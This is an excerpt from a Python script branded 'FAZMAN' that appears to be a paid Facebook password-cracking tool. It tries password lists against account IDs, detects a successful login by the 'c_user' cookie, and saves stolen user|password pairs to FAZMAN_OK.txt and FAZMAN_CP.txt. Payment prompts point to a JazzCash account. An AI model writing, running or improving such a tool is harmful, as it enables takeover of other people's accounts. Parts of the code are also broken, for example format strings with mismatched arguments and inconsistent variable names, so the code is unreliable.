...
logo =                                          """   
\033[0;93m     ___   _____  _______        _____  _   _                                                           
\033[0;93m    (  _ \(  _  )(_____  )/ \_/ \  _  )( ) ( )    
\033[0;96m    | (_(_) (_) |     / / |     | (_) ||  \| |
\033[0;96m    |  _) (  _  )   / /   | (_) |  _  )|     |
\033[0;93m    | |   | | | | / / ___ | | | | | | || | \ |                                                        
\033[0;93m     \(   (_) (_)(_______)(_) (_)_) (_)(() (_)
\033[0;93m     (_)                               (_) 
 
 
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : FAZMAN
 
\033[0;93mWhatsapp : +2347047848559
 
\033[0;96mGITHUB   : FASSMAN 
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mFAZMAN_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mFAZMAN_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[FAZMAN] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[FAZMAN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('FAZMAN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[FAZMAN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('FAZMAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def bnsbuy():
    ...
    if to in r:
        ...
        print('\rT\n')
        print
        print('\rjazzcash Account Number \n')
        print('\rAccount Name\n')
        print
        print
...
def bnsreg():
    ...
    print
    print('\rjazzcash Account Number9\n')
    print('\rAccount Name\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
